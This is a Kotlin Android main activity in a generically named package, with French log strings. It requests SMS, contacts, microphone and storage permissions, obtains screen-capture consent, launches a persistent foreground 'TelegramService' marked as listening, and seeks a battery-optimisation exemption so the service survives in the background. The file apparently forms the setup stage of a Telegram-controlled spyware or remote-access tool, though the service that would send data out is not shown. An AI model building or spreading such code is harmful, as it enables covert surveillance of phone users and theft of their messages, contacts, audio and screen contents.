package com.company.product

import android.Manifest
import android.content.Intent
import android.content.pm.PackageManager
import android.media.projection.MediaProjectionManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.PowerManager
import android.provider.Settings
import android.widget.Button
import android.widget.ScrollView
import android.widget.TextView
import androidx.activity.ComponentActivity
import androidx.activity.result.contract.ActivityResultContracts
import androidx.core.content.ContextCompat

class MainActivity : ComponentActivity() {

    private lateinit var serviceIntent: Intent
    private lateinit var tvLog: TextView
    private lateinit var scrollLog: ScrollView
    private lateinit var tvStatus: TextView
    private lateinit var btnStop: Button
    private var serviceStarted = false

    private val logListener = object : UiLogger.Listener {
        override fun onLogUpdated(logs: String) {
            runOnUiThread {
                tvLog.text = logs
                scrollLog.post { scrollLog.fullScroll(ScrollView.FOCUS_DOWN) }
            }
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)
        serviceIntent = Intent(this, TelegramService::class.java)

        tvLog = findViewById(R.id.tvLog)
        scrollLog = findViewById(R.id.scrollLog)
        tvStatus = findViewById(R.id.tvStatus)
        btnStop = findViewById(R.id.btnStop)
        findViewById<Button>(R.id.btnClear).setOnClickListener {
            UiLogger.clear()
        }

        UiLogger.addListener(logListener)
        UiLogger.log("APP", "App demarree")

        requestAllPermissions()
    }

    override fun onDestroy() {
        super.onDestroy()
        UiLogger.removeListener(logListener)
    }

    override fun onResume() {
        super.onResume()
        updateStopButton()
    }

    private fun updateStopButton() {
        if (TelegramService.isRunning) {
            btnStop.text = "Stop"
            btnStop.setOnClickListener {
                stopService(serviceIntent)
                serviceStarted = false
                tvStatus.text = "Arrete"
                btnStop.isEnabled = false
                UiLogger.log("APP", "Service arrete manuellement")
            }
        } else {
            btnStop.text = "Start"
            btnStop.setOnClickListener {
                requestScreenCapture()
            }
        }
        btnStop.isEnabled = true
    }

    private fun requestAllPermissions() {
        val perms = mutableListOf<String>()

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.POST_NOTIFICATIONS) != PackageManager.PERMISSION_GRANTED)
                perms.add(Manifest.permission.POST_NOTIFICATIONS)
        }

        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED)
            perms.add(Manifest.permission.READ_SMS)

        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED)
            perms.add(Manifest.permission.READ_CONTACTS)

        if (ContextCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED)
            perms.add(Manifest.permission.RECORD_AUDIO)

        if (Build.VERSION.SDK_INT <= Build.VERSION_CODES.Q) {
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED)
                perms.add(Manifest.permission.READ_EXTERNAL_STORAGE)
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.WRITE_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED)
                perms.add(Manifest.permission.WRITE_EXTERNAL_STORAGE)
        }

        if (perms.isNotEmpty()) {
            UiLogger.log("PERMS", "Demande de ${perms.size} permissions: ${perms.joinToString(", ")}")
            permLauncher.launch(perms.toTypedArray())
        } else {
            UiLogger.log("PERMS", "Toutes les permissions OK")
            requestScreenCapture()
        }
    }

    private val permLauncher = registerForActivityResult(
        ActivityResultContracts.RequestMultiplePermissions()
    ) { results ->
        val denied = results.filter { !it.value }.keys
        if (denied.isNotEmpty()) {
            UiLogger.log("PERMS", "Permissions refusées: $denied")
        }
        requestScreenCapture()
    }

    private fun requestScreenCapture() {
        val mgr = getSystemService(MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
        screenCaptureLauncher.launch(mgr.createScreenCaptureIntent())
    }

    private val screenCaptureLauncher = registerForActivityResult(
        ActivityResultContracts.StartActivityForResult()
    ) { result ->
        if (result.resultCode == RESULT_OK && result.data != null) {
            ScreenCaptureManager.resultCode = result.resultCode
            ScreenCaptureManager.data = result.data
            UiLogger.log("APP", "MediaProjection prêt")
        } else {
            UiLogger.log("APP", "MediaProjection refusé (screenshots non disponibles)")
        }
        startTelegramService()
    }

    private fun startTelegramService() {
        UiLogger.log("APP", "Demarrage du service Telegram...")
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(serviceIntent)
        } else {
            startService(serviceIntent)
        }
        serviceStarted = true
        tvStatus.text = "En ecoute..."
        requestBatteryOptimizationExemption()
    }

    private fun requestBatteryOptimizationExemption() {
        val pm = getSystemService(POWER_SERVICE) as PowerManager
        if (!pm.isIgnoringBatteryOptimizations(packageName)) {
            UiLogger.log("APP", "Demande exemption batterie...")
            val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
                data = Uri.parse("package:$packageName")
            }
            batteryOptimizationLauncher.launch(intent)
        }
    }

    private val batteryOptimizationLauncher = registerForActivityResult(
        ActivityResultContracts.StartActivityForResult()
    ) { result ->
        val pm = getSystemService(POWER_SERVICE) as PowerManager
        if (pm.isIgnoringBatteryOptimizations(packageName)) {
            UiLogger.log("APP", "Battery optimization ignoree - service persiste en arriere-plan")
        } else {
            UiLogger.log("APP", "Battery optimization NON ignoree - le service peut etre tue par Doze")
        }
    }
}
